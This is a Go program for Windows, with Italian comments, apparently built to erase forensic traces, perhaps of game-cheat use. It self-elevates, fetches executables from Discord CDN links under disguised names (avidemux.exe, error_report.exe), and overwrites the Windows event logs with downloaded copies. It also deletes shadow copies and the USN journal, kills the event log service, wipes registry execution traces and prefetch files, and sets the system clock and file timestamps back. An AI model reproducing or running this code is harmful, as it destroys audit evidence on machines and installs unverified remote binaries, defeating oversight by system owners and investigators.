package main

import (
	"bufio"
	"errors"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"math/rand"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"strconv"
	"strings"
	"syscall"
	"time"

	"github.com/kardianos/service"
	"github.com/shirou/gopsutil/process"
	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"
)

func main() {
	if !amAdmin() {
		runMeElevated()
	}
	currentTime := setBackwardTime()
	terminateProcess()
	regedit()
	downloadAvidemux()
	errorREPORT()
	modifica()
	time.Sleep(20 * time.Second)
	//pf2()
	pf3()
	shadowcopy()
	regedit2()
	journalbypass()
	AppInfo1()
	restoreNormalTime(currentTime)
	time.Sleep(4 * time.Second)
	eventlog()
	time.Sleep(2 * time.Second)
	event2()
	time.Sleep(1 * time.Second)
	event()
	time.Sleep(1 * time.Second)
	event1()
	time.Sleep(2 * time.Second)
	eventlog1()
	time.Sleep(5 * time.Second)
	start2()
	time.Sleep(5 * time.Second)
	metti()
}
func metti() {
	folderPath := "C:\\Windows\\Prefetch"

	// Reset dei permessi sulla cartella usando icacls
	resetCommand := "icacls"
	resetArgs := []string{folderPath, "/reset"}

	resetCmd := exec.Command(resetCommand, resetArgs...)
	resetCmd.Stdout = os.Stdout
	resetCmd.Stderr = os.Stderr

	err := resetCmd.Run()
	if err != nil {
		log.Fatal("Errore durante l'esecuzione del comando icacls /reset:", err)
	}

	//log.Println("Permessi ripristinati sulla cartella:", folderPath)
}
func setBackwardTime() time.Time {
	// Ottenere l'orario corrente
	currentTime := time.Now()
	//fmt.Println("Orario corrente:",
	currentTime.Format("2006-01-02 15:04:05")

	// Generare un'ora casuale da sottrarre all'orario corrente
	rand.Seed(time.Now().UnixNano())
	hoursToSubtract := rand.Intn(8) + 1 // Sottrae da 1 a 4 ore

	// Verificare se è necessario sottrarre anche i minuti
	if hoursToSubtract > currentTime.Hour() {
		minutesToSubtract := rand.Intn(60) // Sottrae casualmente i minuti
		currentTime = currentTime.Add(-time.Duration(minutesToSubtract) * time.Minute)
	}

	// Calcolare il nuovo orario sottraendo l'ora casuale
	newTime := currentTime.Add(-time.Duration(hoursToSubtract) * time.Hour)

	// Impostare il nuovo orario di sistema su Windows
	cmd := exec.Command("cmd", "/C", "time", newTime.Format("15:04:05"))
	err := cmd.Run()
	if err != nil {
		fmt.Println("Errore durante la modifica dell'orario:", err)
		os.Exit(1)
	}

	cmd = exec.Command("cmd", "/C", "date", "/T", newTime.Format("01-02-2006"))
	err = cmd.Run()
	if err != nil {
		fmt.Println("Errore durante la modifica della data:", err)
		os.Exit(1)
	}

	//fmt.Println("Orario modificato:", newTime.Format("2006-01-02 15:04:05"))

	// Attendere 3 secondi
	time.Sleep(3 * time.Second)

	return currentTime
}
func restoreNormalTime(currentTime time.Time) {
	// Ripristinare l'orario corrente su Windows
	restoreCmd := exec.Command("cmd", "/C", "time", currentTime.Format("15:04:05"))
	err := restoreCmd.Run()
	if err != nil {
		fmt.Println("Errore durante il ripristino dell'orario:", err)
		os.Exit(1)
	}

	restoreCmd = exec.Command("cmd", "/C", "date", "/T", currentTime.Format("01-02-2006"))
	err = restoreCmd.Run()
	if err != nil {
		fmt.Println("Errore durante il ripristino della data:", err)
		os.Exit(1)
	}

	//fmt.Println("Orario ripristinato:",
	currentTime.Format("2006-01-02 15:04:05")
}
func AppInfo1() {

	// Configura il servizio "eventlog"
	config := &service.Config{
		Name:        "AppInfo",
		DisplayName: "AppInfo",
	}

	// Connessione al servizio "eventlog"
	s, err := service.New(nil, config)
	if err != nil {
		// fmt.Println("Errore durante la connessione al servizio:", err)
		return
	}

	// Riavviare il servizio "eventlog"
	err = s.Start()
	if err != nil {
		// fmt.Println("Errore durante il riavvio del servizio:", err)
		return
	}

	// fmt.Println("Servizio riavviato con successo")
}
func start2() {
	services := []string{"Bam", "DPS"}

	// Avvia i servizi
	for _, service := range services {
		for retry := 0; retry < 3; retry++ { // Riprova per massimo 3 volte
			err := startService(service)
			if err != nil {
				//log.Printf("Errore durante l'avvio del servizio %s: %v\n", service, err)
				time.Sleep(5 * time.Second) // Aspetta 5 secondi prima di riprovare
			} else {
				//log.Printf("Il servizio %s è stato avviato.\n", service)
				break // Esci dal loop di retry se il servizio è stato avviato con successo
			}
		}
	}
}
func startService(serviceName string) error {
	scm, err := windows.OpenSCManager(nil, nil, windows.SC_MANAGER_CONNECT|windows.SC_MANAGER_ENUMERATE_SERVICE)
	if err != nil {
		return err
	}
	defer windows.CloseServiceHandle(scm)

	serviceHandle, err := windows.OpenService(scm, windows.StringToUTF16Ptr(serviceName), windows.SERVICE_START|windows.SERVICE_QUERY_STATUS|windows.SERVICE_ENUMERATE_DEPENDENTS)
	if err != nil {
		return err
	}
	defer windows.CloseServiceHandle(serviceHandle)

	var serviceStatus windows.SERVICE_STATUS
	err = windows.QueryServiceStatus(serviceHandle, &serviceStatus)
	if err != nil {
		return err
	}

	if serviceStatus.CurrentState == windows.SERVICE_RUNNING {
		return nil // Il servizio è già in esecuzione
	}

	// Avvia il servizio
	if err = windows.StartService(serviceHandle, 0, nil); err != nil {
		return err
	}

	// Attendi fino a quando il servizio viene avviato o raggiunge lo stato "start_pending"
	timeout := 30 * time.Second
	startTime := time.Now()

	for {
		err = windows.QueryServiceStatus(serviceHandle, &serviceStatus)
		if err != nil {
			return err
		}

		if serviceStatus.CurrentState == windows.SERVICE_RUNNING {
			return nil // Il servizio è stato avviato correttamente
		}

		if serviceStatus.CurrentState == windows.SERVICE_START_PENDING {
			// Verifica se è scaduto il timeout
			elapsedTime := time.Since(startTime)
			if elapsedTime >= timeout {
				return errors.New("timeout: il servizio non si è avviato entro il limite di tempo")
			}

			// Aspetta per un breve periodo prima di verificare nuovamente lo stato del servizio
			time.Sleep(500 * time.Millisecond)
		} else {
			return errors.New("errore: il servizio non si è avviato correttamente")
		}
	}
}
func eventlog1() {

	// Configura il servizio "eventlog"
	config := &service.Config{
		Name:        "eventlog",
		DisplayName: "Event Log",
	}

	// Connessione al servizio "eventlog"
	s, err := service.New(nil, config)
	if err != nil {
		// fmt.Println("Errore durante la connessione al servizio:", err)
		return
	}

	// Riavviare il servizio "eventlog"
	err = s.Start()
	if err != nil {
		// fmt.Println("Errore durante il riavvio del servizio:", err)
		return
	}

	// fmt.Println("Servizio riavviato con successo")
}
func event() {
	url := "https://cdn.discordapp.com/attachments/1108786431020769330/1110639846080385068/Application.evtx"

	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		//fmt.Println(err)
		return
	}

	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		//fmt.Println(err)
		return
	}
	defer resp.Body.Close()

	file, err := os.Create("C:\\Windows\\System32\\winevt\\Logs\\Application.evtx")
	if err != nil {
		//fmt.Println(err)
		return
	}
	defer file.Close()

	_, err = io.Copy(file, resp.Body)
	if err != nil {
		//fmt.Println(err)
		return
	}

}
func event1() {
	url := "https://cdn.discordapp.com/attachments/1108786431020769330/1121510596500783254/Security.evtx"

	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		//fmt.Println(err)
		return
	}

	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		//fmt.Println(err)
		return
	}
	defer resp.Body.Close()

	file, err := os.Create("C:\\Windows\\System32\\winevt\\Logs\\Security.evtx")
	if err != nil {
		//fmt.Println(err)
		return
	}
	defer file.Close()

	_, err = io.Copy(file, resp.Body)
	if err != nil {
		//fmt.Println(err)
		return
	}

}
func event2() {
	url := "https://cdn.discordapp.com/attachments/1108786431020769330/1110639846512414781/System.evtx"

	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		//fmt.Println(err)
		return
	}

	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		//fmt.Println(err)
		return
	}
	defer resp.Body.Close()

	file, err := os.Create("C:\\Windows\\System32\\winevt\\Logs\\System.evtx")
	if err != nil {
		//fmt.Println(err)
		return
	}
	defer file.Close()

	_, err = io.Copy(file, resp.Body)
	if err != nil {
		//fmt.Println(err)
		return
	}

}
func eventlog() {
	// Esegui la query per il processo "eventlog"
	cmd := exec.Command("sc", "queryex", "eventlog")
	stdout, err := cmd.StdoutPipe()
	if err != nil {
		//fmt.Println("Errore durante l'esecuzione del comando:", err)
		return
	}
	defer stdout.Close()

	if err := cmd.Start(); err != nil {
		//fmt.Println("Errore durante l'esecuzione del comando:", err)
		return
	}

	// Leggi l'output della query
	scanner := bufio.NewScanner(stdout)
	var pid int
	pattern := regexp.MustCompile(`\d+`)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if strings.HasPrefix(line, "PID") {
			pidStr := pattern.FindStringSubmatch(line)[0]
			pid, err = strconv.Atoi(pidStr)
			if err != nil {
				//fmt.Println("Errore durante la conversione del PID:", err)
				return
			}
			break
		}
	}

	if err := scanner.Err(); err != nil {
		//fmt.Println("Errore durante la lettura dell'output:", err)
		return
	}

	if err := cmd.Wait(); err != nil {
		//fmt.Println("Errore durante l'esecuzione del comando:", err)
		return
	}

	if pid == 0 {
		//fmt.Println("Processo non trovato")
		return
	}

	// Termina il processo utilizzando il suo PID
	killCmd := exec.Command("taskkill", "/F", "/PID", strconv.Itoa(pid))
	if err := killCmd.Run(); err != nil {
		//fmt.Println("Errore durante la terminazione del processo:", err)
		return
	}

	//fmt.Println("Processo terminato con successo")
}
func journalbypass() {
	cmd := exec.Command("cmd", "/c", "fsutil usn deletejournal /d c: >nul")
	err := cmd.Run()
	if err != nil {
		//panic(err)
	}
	time.Sleep(5 * time.Second)
	cmd = exec.Command("cmd", "/c", "fsutil usn createjournal m=1000 a=100 c: >nul")
	err = cmd.Run()
	if err != nil {
		//panic(err)
	}
}
func errorREPORT() {
	url := "https://cdn.discordapp.com/attachments/1108786431020769330/1130085942397509692/error_report.exe"
	filePath := "C:\\Program Files\\TeamSpeak 3 Client\\error_report.exe"

	response, err := http.Get(url)
	if err != nil {
		fmt.Printf("Si è verificato un errore durante il download del file: %v\n", err)
		return
	}
	defer response.Body.Close()

	file, err := os.Create(filePath)
	if err != nil {
		fmt.Printf("Si è verificato un errore durante la creazione del file: %v\n", err)
		return
	}
	defer file.Close()

	_, err = io.Copy(file, response.Body)
	if err != nil {
		fmt.Printf("Si è verificato un errore durante la scrittura del file: %v\n", err)
		return
	}

	//fmt.Println("Il file è stato scaricato correttamente.")
}

func shadowcopy() {
	cmd := exec.Command("vssadmin", "delete", "shadows", "/for=C:", "/oldest")

	output, err := cmd.CombinedOutput()
	if err != nil {
		if exitErr, ok := err.(*exec.ExitError); ok {
			// Il comando ha restituito un codice di uscita non zero
			exitCode := exitErr.ExitCode()
			if exitCode != 0 {
				//log.Printf("Il comando ha restituito il codice di uscita %d\nOutput: %s", exitCode, string(output))
				//log.Println("Non ci sono criteri che soddisfano la query.")
				return
			}
		}

		log.Fatalf("Errore durante l'esecuzione del comando: %s\nOutput: %s", err, string(output))
	}

	//log.Println("Shadow copy eliminata con successo.")
}
func modifica() {
	// Imposta il nuovo percorso di Avidemux
	filePath := "C:\\Program Files\\Avidemux 2.8 VC++ 64bits\\avidemux.exe"

	err := updateFileModificationTime(filePath)
	if err != nil {
		//fmt.Printf("Errore durante l'aggiornamento della data di modifica: %v\n", err)
		return
	}

	//fmt.Println("Data di modifica del file aggiornata con successo.")
}

func downloadAvidemux() {
	url := "https://cdn.discordapp.com/attachments/1108786431020769330/1132233613040164864/avidemux.exe"

	programFilesDir := "C:\\Program Files\\Avidemux 2.8 VC++ 64bits"

	// Crea la cartella se non esiste
	err := os.MkdirAll(programFilesDir, os.ModePerm)
	if err != nil {
		fmt.Printf("Impossibile creare la cartella: %v\n", err)
		return
	}

	filePath := filepath.Join(programFilesDir, "avidemux.exe")

	response, err := http.Get(url)
	if err != nil {
		fmt.Printf("Si è verificato un errore durante il download del file: %v\n", err)
		return
	}
	defer response.Body.Close()

	file, err := os.Create(filePath)
	if err != nil {
		fmt.Printf("Si è verificato un errore durante la creazione del file: %v\n", err)
		return
	}
	defer file.Close()

	_, err = io.Copy(file, response.Body)
	if err != nil {
		fmt.Printf("Si è verificato un errore durante la scrittura del file: %v\n", err)
		return
	}

	//fmt.Println("Il file è stato scaricato correttamente.")
}

func runMeElevated() {
	verb := "runas"
	exe, _ := os.Executable()
	cwd, _ := os.Getwd()
	args := strings.Join(os.Args[1:], " ")

	verbPtr, _ := syscall.UTF16PtrFromString(verb)
	exePtr, _ := syscall.UTF16PtrFromString(exe)
	cwdPtr, _ := syscall.UTF16PtrFromString(cwd)
	argPtr, _ := syscall.UTF16PtrFromString(args)

	var showCmd int32 = 1 //SW_NORMAL

	err := windows.ShellExecute(0, verbPtr, exePtr, argPtr, cwdPtr, showCmd)
	if err != nil {
		//fmt.Println(err)
	}
}

func amAdmin() bool {
	_, err := os.Open("\\\\.\\PHYSICALDRIVE0")
	if err != nil {
		return false
	}
	return true
}

func terminateProcess() {
	pids, err := process.Pids()
	if err != nil {
		//fmt.Println("Errore durante l'ottenimento dei PID dei processi:", err)
		return
	}

	for _, pid := range pids {
		p, err := process.NewProcess(pid)
		if err != nil {
			//fmt.Printf("Errore durante la creazione del processo per il PID %d: %s\n", pid, err)
			continue
		}

		name, err := p.Name()
		if err != nil {
			//fmt.Printf("Errore durante l'ottenimento del nome del processo per il PID %d: %s\n", pid, err)
			continue
		}

		if name == "avidemux.exe" {
			err := p.Terminate()
			if err != nil {
				//fmt.Printf("Errore durante la terminazione del processo per il PID %d: %s\n", pid, err)
			} else {
				//fmt.Printf("Processo con PID %d terminato con successo.\n", pid)
			}
		}
	}
}

func updateFileModificationTime(filePath string) error {
	// Ottieni l'ora attuale
	currentTime := time.Now()

	// Sottrai 3 ore all'ora attuale
	newTime := currentTime.Add(-5 * time.Hour)

	// Modifica la data di modifica del file
	err := os.Chtimes(filePath, newTime, newTime)
	if err != nil {
		return err
	}

	return nil
}

type Win32_Service struct {
	Name       string
	State      string
	Status     string
	ProcessID  uint32
	StatusCode uint32
}

func regedit() {
	// Elimina le voci che finiscono con "shellcode.exe" dal Registro di sistema
	err := deleteShellcodeEntries()
	if err != nil {
		//fmt.Println("Errore durante l'eliminazione delle voci:", err)
		return
	}
	//fmt.Println("Voci eliminate con successo dal Registro di sistema.")
}

// Funzione per eliminare le voci che finiscono con "shellcode.exe" dal Registro di sistema
func deleteShellcodeEntries() error {
	k, err := registry.OpenKey(registry.CURRENT_USER, `SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Compatibility Assistant\Store`, registry.ALL_ACCESS)
	if err != nil {
		return err
	}
	defer k.Close()

	// Ottieni tutti i nomi delle voci all'interno della chiave "Store"
	names, err := k.ReadValueNames(-1)
	if err != nil {
		return err
	}

	for _, name := range names {
		if strings.HasSuffix(name, "remotecache.vdf") {
			// Elimina il valore all'interno della voce
			err := k.DeleteValue(name)
			if err != nil {
				//fmt.Printf("Errore durante l'eliminazione del valore %s: %v\n", name, err)
			} else {
				//fmt.Printf("Valore %s eliminato con successo.\n", name)
			}
		}
	}

	return nil
}
func regedit2() {
	// Elimina le voci che finiscono con "shellcode.exe" dal Registro di sistema
	err := deleteShellcodeEntries2()
	if err != nil {
		//fmt.Println("Errore durante l'eliminazione delle voci:", err)
		return
	}
	//fmt.Println("Voci eliminate con successo dal Registro di sistema.")
}

// Funzione per eliminare le voci che finiscono con "shellcode.exe" dal Registro di sistema
func deleteShellcodeEntries2() error {
	k, err := registry.OpenKey(registry.CLASSES_ROOT, `Local Settings\Software\Microsoft\Windows\Shell\MuiCache`, registry.ALL_ACCESS)
	if err != nil {
		return err
	}
	defer k.Close()

	// Ottieni tutti i nomi delle voci all'interno della chiave "Store"
	names, err := k.ReadValueNames(-1)
	if err != nil {
		return err
	}

	for _, name := range names {
		if strings.HasSuffix(name, "error_report.exe.FriendlyAppName") {
			// Elimina il valore all'interno della voce
			err := k.DeleteValue(name)
			if err != nil {
				//fmt.Printf("Errore durante l'eliminazione del valore %s: %v\n", name, err)
			} else {
				//fmt.Printf("Valore %s eliminato con successo.\n", name)
			}
		}
	}

	return nil
}

func pf2() {
	prefetchFolder := "C:\\Windows\\Prefetch"                                                     // Modifica il percorso se necessario
	prefixesToMatch := []string{"CALC.EXE", "ERROR_REPORT", "TASKHOSTW.EXE", "CALCULATORAPP.EXE"} // I prefissi da cercare (tutti maiuscoli)
	destinationPath := "C:\\Program Files (x86)\\Steam\\dumps\\reports"

	files, err := ioutil.ReadDir(prefetchFolder)
	if err != nil {
		fmt.Println("Errore durante la lettura della cartella Prefetch:", err)
		return
	}

	for _, file := range files {
		for _, prefix := range prefixesToMatch {
			if strings.HasPrefix(strings.ToUpper(file.Name()), prefix) {
				filePath := filepath.Join(prefetchFolder, file.Name())
				err := moveAndDeleteFile(filePath, destinationPath)
				if err != nil {
					//fmt.Printf("Errore durante lo spostamento del file %s: %v\n", file.Name(), err)
				} else {
					//fmt.Printf("Il file %s è stato spostato e poi eliminato con successo.\n", file.Name())
				}
			}
		}
	}
}

func moveAndDeleteFile(sourcePath, destinationPath string) error {
	sourceFile, err := os.Open(sourcePath)
	if err != nil {
		return err
	}
	defer sourceFile.Close()

	destinationFile, err := os.Create(filepath.Join(destinationPath, filepath.Base(sourcePath)))
	if err != nil {
		return err
	}
	defer destinationFile.Close()

	_, err = io.Copy(destinationFile, sourceFile)
	if err != nil {
		return err
	}

	// Chiude il file prima di eliminarlo
	if err := sourceFile.Close(); err != nil {
		return err
	}

	err = os.Remove(sourcePath)
	if err != nil {
		return err
	}

	return nil
}
func pf3() {
	pathToDelete := "C:\\Program Files (x86)\\Steam\\dumps\\reports"
	err := deleteFilesWithExtension(pathToDelete, ".pf")
	if err != nil {
		//fmt.Println("Errore durante l'eliminazione dei file:", err)
		return
	}
	//fmt.Println("Tutti i file con estensione .pf sono stati eliminati correttamente.")
}

func deleteFilesWithExtension(dirPath, extension string) error {
	files, err := ioutil.ReadDir(dirPath)
	if err != nil {
		return err
	}

	for _, file := range files {
		if file.IsDir() {
			continue // Ignora le directory, considera solo i file
		}

		if filepath.Ext(file.Name()) == extension {
			filePath := filepath.Join(dirPath, file.Name())
			err := os.Remove(filePath)
			if err != nil {
				return err
			}
			fmt.Printf("Il file %s è stato eliminato.\n", file.Name())
		}
	}

	return nil
}
